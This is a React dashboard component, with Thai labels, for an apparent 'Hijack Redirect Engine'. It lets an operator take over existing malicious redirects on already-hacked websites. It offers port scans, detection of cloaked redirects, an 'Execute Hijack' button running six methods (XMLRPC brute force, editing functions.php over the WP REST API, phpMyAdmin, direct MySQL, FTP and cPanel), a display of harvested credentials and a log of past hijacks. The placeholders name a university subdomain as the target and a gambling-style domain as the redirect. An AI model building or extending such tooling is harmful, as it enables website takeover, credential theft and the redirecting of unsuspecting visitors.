/**
 * Hijack Redirect Dashboard
 * 
 * Execute and monitor redirect hijack attacks on already-compromised sites.
 * Shows 6 attack methods with real-time progress, port scan results, and history.
 */
import { useState, useEffect, useCallback } from "react";
import { trpc } from "@/lib/trpc";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { toast } from "sonner";
import {
  Crosshair, Wifi, Database, Server, FolderOpen, Shield,
  Play, Loader2, CheckCircle2, XCircle, Clock, RefreshCw,
  Globe, ArrowRight, Scan, Lock, Unlock, AlertTriangle,
} from "lucide-react";

// Method icons and labels
const METHOD_INFO: Record<string, { icon: React.ReactNode; label: string; description: string; color: string }> = {
  xmlrpc_brute: {
    icon: <Lock className="w-4 h-4" />,
    label: "XMLRPC Brute Force",
    description: "ลอง username/password ผ่าน xmlrpc.php",
    color: "text-red-400",
  },
  wp_rest_editor: {
    icon: <Globe className="w-4 h-4" />,
    label: "WP REST API Editor",
    description: "แก้ functions.php ผ่าน REST API",
    color: "text-blue-400",
  },
  phpmyadmin: {
    icon: <Database className="w-4 h-4" />,
    label: "PHPMyAdmin",
    description: "เข้า PMA บน port 2030/8080/8443",
    color: "text-yellow-400",
  },
  mysql_direct: {
    icon: <Server className="w-4 h-4" />,
    label: "MySQL Direct",
    description: "เชื่อมต่อ MySQL port 3306 โดยตรง",
    color: "text-green-400",
  },
  ftp_access: {
    icon: <FolderOpen className="w-4 h-4" />,
    label: "FTP Access",
    description: "login FTP port 21 แล้วแก้ไฟล์",
    color: "text-purple-400",
  },
  cpanel_access: {
    icon: <Shield className="w-4 h-4" />,
    label: "cPanel File Manager",
    description: "เข้า cPanel port 2082/2083",
    color: "text-orange-400",
  },
};

function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`;
  return `${Math.floor(ms / 60000)}m ${Math.floor((ms % 60000) / 1000)}s`;
}

export default function HijackRedirect() {

  const [targetDomain, setTargetDomain] = useState("");
  const [newRedirectUrl, setNewRedirectUrl] = useState("");
  const [activeJobId, setActiveJobId] = useState<string | null>(null);
  const [portScanResult, setPortScanResult] = useState<any>(null);
  const [redirectDetection, setRedirectDetection] = useState<any>(null);
  const [isScanning, setIsScanning] = useState(false);
  const [isDetecting, setIsDetecting] = useState(false);

  // Mutations
  const executeMutation = trpc.hijackRedirect.execute.useMutation({
    onSuccess: (data) => {
      setActiveJobId(data.jobId);
      toast.success(`Hijack started: ${data.jobId}`);
    },
    onError: (err) => {
      toast.error(`Error: ${err.message}`);
    },
  });

  const scanPortsMutation = trpc.hijackRedirect.scanPorts.useMutation({
    onSuccess: (data) => {
      setPortScanResult(data);
      setIsScanning(false);
    },
    onError: (err) => {
      toast.error(`Scan error: ${err.message}`);
      setIsScanning(false);
    },
  });

  const detectRedirectMutation = trpc.hijackRedirect.detectRedirect.useMutation({
    onSuccess: (data) => {
      setRedirectDetection(data);
      setIsDetecting(false);
    },
    onError: (err) => {
      toast.error(`Detection error: ${err.message}`);
      setIsDetecting(false);
    },
  });

  // Job status polling
  const jobStatus = trpc.hijackRedirect.getStatus.useQuery(
    { jobId: activeJobId! },
    { enabled: !!activeJobId, refetchInterval: activeJobId ? 2000 : false }
  );

  // Stop polling when job is done
  useEffect(() => {
    if (jobStatus.data?.status === "done" || jobStatus.data?.status === "failed") {
      // Keep jobId for display but stop polling after a delay
      setTimeout(() => {}, 3000);
    }
  }, [jobStatus.data?.status]);

  // History
  const history = trpc.hijackRedirect.getHistory.useQuery({ limit: 20 });

  const handleScanPorts = useCallback(() => {
    if (!targetDomain) return;
    setIsScanning(true);
    setPortScanResult(null);
    scanPortsMutation.mutate({ domain: targetDomain });
  }, [targetDomain]);

  const handleDetectRedirect = useCallback(() => {
    if (!targetDomain) return;
    setIsDetecting(true);
    setRedirectDetection(null);
    detectRedirectMutation.mutate({ domain: targetDomain });
  }, [targetDomain]);

  const handleExecute = useCallback(() => {
    if (!targetDomain || !newRedirectUrl) {
      toast.error("ต้องระบุ domain และ redirect URL");
      return;
    }
    executeMutation.mutate({
      targetDomain,
      newRedirectUrl,
    });
  }, [targetDomain, newRedirectUrl]);

  const isJobRunning = activeJobId && jobStatus.data?.status === "running";

  return (
    <div className="space-y-6 p-4 md:p-6 max-w-7xl mx-auto">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold flex items-center gap-2">
          <Unlock className="w-6 h-6 text-amber-400" />
          Hijack Redirect Engine
        </h1>
        <p className="text-sm text-muted-foreground mt-1">
          ยึด redirect ที่มีอยู่แล้วบนเว็บที่ถูกแฮก — 6 วิธี: XMLRPC Brute, WP REST, PHPMyAdmin, MySQL, FTP, cPanel
        </p>
      </div>

      {/* Target Input */}
      <Card className="border-amber-500/30 bg-amber-500/5">
        <CardHeader className="pb-3">
          <CardTitle className="text-lg flex items-center gap-2">
            <Crosshair className="w-5 h-5 text-amber-400" />
            Target Configuration
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-sm font-medium">Target Domain</label>
              <Input
                placeholder="empleos.uncp.edu.pe"
                value={targetDomain}
                onChange={(e) => setTargetDomain(e.target.value)}
                className="font-mono"
              />
            </div>
            <div className="space-y-2">
              <label className="text-sm font-medium">New Redirect URL</label>
              <Input
                placeholder="https://hkt956.org/"
                value={newRedirectUrl}
                onChange={(e) => setNewRedirectUrl(e.target.value)}
                className="font-mono"
              />
            </div>
          </div>

          <div className="flex flex-wrap gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={handleScanPorts}
              disabled={!targetDomain || isScanning}
            >
              {isScanning ? <Loader2 className="w-4 h-4 mr-1 animate-spin" /> : <Scan className="w-4 h-4 mr-1" />}
              Scan Ports
            </Button>
            <Button
              variant="outline"
              size="sm"
              onClick={handleDetectRedirect}
              disabled={!targetDomain || isDetecting}
            >
              {isDetecting ? <Loader2 className="w-4 h-4 mr-1 animate-spin" /> : <Globe className="w-4 h-4 mr-1" />}
              Detect Redirect
            </Button>
            <div className="flex-1" />
            <Button
              onClick={handleExecute}
              disabled={!targetDomain || !newRedirectUrl || !!isJobRunning || executeMutation.isPending}
              className="bg-amber-600 hover:bg-amber-700 text-white"
            >
              {executeMutation.isPending || isJobRunning ? (
                <Loader2 className="w-4 h-4 mr-1 animate-spin" />
              ) : (
                <Play className="w-4 h-4 mr-1" />
              )}
              Execute Hijack (6 Methods)
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Recon Results */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {/* Port Scan Results */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <Wifi className="w-4 h-4 text-cyan-400" />
              Port Scan Results
            </CardTitle>
          </CardHeader>
          <CardContent>
            {portScanResult ? (
              <div className="grid grid-cols-2 gap-2 text-sm">
                {[
                  { label: "FTP (21)", open: portScanResult.ftp },
                  { label: "SSH (22)", open: portScanResult.ssh },
                  { label: "HTTP (80)", open: portScanResult.http },
                  { label: "HTTPS (443)", open: portScanResult.https },
                  { label: "PMA (2030)", open: portScanResult.pma },
                  { label: "cPanel (2082)", open: portScanResult.cpanel },
                  { label: "cPanel SSL (2083)", open: portScanResult.cpanelSsl },
                  { label: "MySQL (3306)", open: portScanResult.mysql },
                  { label: "Alt (8080)", open: portScanResult.alt8080 },
                  { label: "Alt (8443)", open: portScanResult.alt8443 },
                ].map((p) => (
                  <div key={p.label} className="flex items-center gap-2">
                    {p.open ? (
                      <CheckCircle2 className="w-3.5 h-3.5 text-green-400" />
                    ) : (
                      <XCircle className="w-3.5 h-3.5 text-zinc-600" />
                    )}
                    <span className={p.open ? "text-green-300" : "text-zinc-500"}>{p.label}</span>
                  </div>
                ))}
              </div>
            ) : (
              <p className="text-sm text-muted-foreground">กด Scan Ports เพื่อตรวจสอบ</p>
            )}
          </CardContent>
        </Card>

        {/* Redirect Detection */}
        <Card>
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <ArrowRight className="w-4 h-4 text-orange-400" />
              Redirect Detection
            </CardTitle>
          </CardHeader>
          <CardContent>
            {redirectDetection ? (
              <div className="space-y-3 text-sm">
                <div>
                  <span className="text-muted-foreground">Normal:</span>
                  <Badge variant="outline" className="ml-2">{redirectDetection.normal?.type || "unknown"}</Badge>
                  {redirectDetection.normal?.currentUrl && (
                    <p className="text-xs text-muted-foreground mt-1 font-mono break-all">
                      {redirectDetection.normal.currentUrl}
                    </p>
                  )}
                </div>
                {redirectDetection.cloaked && (
                  <div>
                    <span className="text-muted-foreground">Cloaked (Thai):</span>
                    <Badge variant="outline" className="ml-2 border-red-500/50 text-red-400">
                      {redirectDetection.cloaked.type}
                    </Badge>
                    {redirectDetection.cloaked.currentUrl && (
                      <p className="text-xs text-muted-foreground mt-1 font-mono break-all">
                        {redirectDetection.cloaked.currentUrl}
                      </p>
                    )}
                  </div>
                )}
                {redirectDetection.normal?.rawSnippet && (
                  <div>
                    <span className="text-xs text-muted-foreground">Snippet:</span>
                    <pre className="text-xs bg-zinc-900 p-2 rounded mt-1 overflow-x-auto max-h-24">
                      {redirectDetection.normal.rawSnippet}
                    </pre>
                  </div>
                )}
              </div>
            ) : (
              <p className="text-sm text-muted-foreground">กด Detect Redirect เพื่อตรวจสอบ</p>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Active Job Progress */}
      {activeJobId && jobStatus.data && (
        <Card className={`border-l-4 ${
          jobStatus.data.status === "running" ? "border-l-amber-500" :
          jobStatus.data.status === "done" ? "border-l-green-500" :
          "border-l-red-500"
        }`}>
          <CardHeader className="pb-3">
            <CardTitle className="text-lg flex items-center gap-2">
              {jobStatus.data.status === "running" && <Loader2 className="w-5 h-5 text-amber-400 animate-spin" />}
              {jobStatus.data.status === "done" && <CheckCircle2 className="w-5 h-5 text-green-400" />}
              {jobStatus.data.status === "failed" && <XCircle className="w-5 h-5 text-red-400" />}
              Hijack Job: {jobStatus.data.domain}
            </CardTitle>
            <CardDescription>
              Status: {jobStatus.data.status} | Elapsed: {formatDuration(jobStatus.data.elapsedMs)}
            </CardDescription>
          </CardHeader>
          <CardContent>
            {/* Progress */}
            <div className="mb-4">
              <div className="flex items-center gap-2 text-sm">
                <span className="text-muted-foreground">Phase:</span>
                <span className="font-mono">{jobStatus.data.progress.phase}</span>
              </div>
              <p className="text-sm text-muted-foreground mt-1">{jobStatus.data.progress.detail}</p>
              <div className="w-full bg-zinc-800 rounded-full h-2 mt-2">
                <div
                  className={`h-2 rounded-full transition-all duration-500 ${
                    jobStatus.data.status === "done" ? "bg-green-500" :
                    jobStatus.data.status === "failed" ? "bg-red-500" :
                    "bg-amber-500"
                  }`}
                  style={{
                    width: `${Math.min(100, (jobStatus.data.progress.methodIndex / Math.max(1, jobStatus.data.progress.totalMethods)) * 100)}%`,
                  }}
                />
              </div>
            </div>

            {/* Method Results (when done) */}
            {jobStatus.data.result?.methodResults && (
              <div className="space-y-2">
                <h4 className="text-sm font-medium">Method Results:</h4>
                {jobStatus.data.result.methodResults.map((mr: any, i: number) => {
                  const info = METHOD_INFO[mr.method] || { icon: <Globe className="w-4 h-4" />, label: mr.method, color: "text-zinc-400" };
                  return (
                    <div key={i} className="flex items-start gap-3 p-2 rounded bg-zinc-900/50 text-sm">
                      <div className={`mt-0.5 ${info.color}`}>{info.icon}</div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="font-medium">{info.label}</span>
                          {mr.success ? (
                            <Badge className="bg-green-500/20 text-green-400 text-xs">SUCCESS</Badge>
                          ) : (
                            <Badge variant="outline" className="text-zinc-500 text-xs">FAILED</Badge>
                          )}
                          <span className="text-xs text-muted-foreground ml-auto">{formatDuration(mr.durationMs)}</span>
                        </div>
                        <p className="text-xs text-muted-foreground mt-0.5 break-all">{mr.detail}</p>
                        {mr.credentialsFound && (
                          <p className="text-xs text-amber-400 mt-0.5 font-mono">
                            Creds: {mr.credentialsFound.username}:{mr.credentialsFound.password}
                          </p>
                        )}
                      </div>
                    </div>
                  );
                })}

                {/* Port scan summary */}
                {jobStatus.data.result.portsOpen && (
                  <div className="mt-2 p-2 rounded bg-zinc-900/50 text-xs">
                    <span className="text-muted-foreground">Open Ports: </span>
                    {Object.entries(jobStatus.data.result.portsOpen)
                      .filter(([k, v]) => v === true && k !== "scannedAt")
                      .map(([k]) => k)
                      .join(", ") || "none"}
                  </div>
                )}

                {/* Redirect pattern */}
                {jobStatus.data.result.redirectPattern && (
                  <div className="mt-2 p-2 rounded bg-zinc-900/50 text-xs">
                    <span className="text-muted-foreground">Redirect Pattern: </span>
                    <span className="text-orange-400">{jobStatus.data.result.redirectPattern.type}</span>
                    {jobStatus.data.result.redirectPattern.currentUrl && (
                      <span className="text-muted-foreground"> → {jobStatus.data.result.redirectPattern.currentUrl}</span>
                    )}
                  </div>
                )}
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* 6 Methods Overview */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="text-lg">Attack Methods</CardTitle>
          <CardDescription>6 วิธีที่ใช้ในการยึด redirect</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
            {Object.entries(METHOD_INFO).map(([key, info]) => (
              <div key={key} className="p-3 rounded-lg bg-zinc-900/50 border border-zinc-800">
                <div className="flex items-center gap-2">
                  <div className={info.color}>{info.icon}</div>
                  <span className="font-medium text-sm">{info.label}</span>
                </div>
                <p className="text-xs text-muted-foreground mt-1">{info.description}</p>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* History */}
      <Card>
        <CardHeader className="pb-3">
          <CardTitle className="text-lg flex items-center gap-2">
            <Clock className="w-5 h-5 text-zinc-400" />
            Hijack History
          </CardTitle>
          <CardDescription>ประวัติการ hijack redirect ที่ผ่านมา</CardDescription>
        </CardHeader>
        <CardContent>
          {history.data && history.data.length > 0 ? (
            <div className="space-y-2">
              {history.data.map((row: any) => (
                <div key={row.id} className="flex items-center gap-3 p-2 rounded bg-zinc-900/50 text-sm">
                  {row.success ? (
                    <CheckCircle2 className="w-4 h-4 text-green-400 shrink-0" />
                  ) : (
                    <XCircle className="w-4 h-4 text-red-400 shrink-0" />
                  )}
                  <div className="flex-1 min-w-0">
                    <span className="font-mono text-xs">{row.targetDomain}</span>
                    {row.redirectUrl && (
                      <span className="text-xs text-muted-foreground ml-2">→ {row.redirectUrl.substring(0, 40)}</span>
                    )}
                  </div>
                  <div className="text-xs text-muted-foreground shrink-0">
                    {row.durationMs ? formatDuration(row.durationMs) : "—"}
                  </div>
                  <div className="text-xs text-muted-foreground shrink-0">
                    {row.createdAt ? new Date(row.createdAt).toLocaleDateString() : "—"}
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <p className="text-sm text-muted-foreground text-center py-4">ยังไม่มีประวัติ</p>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
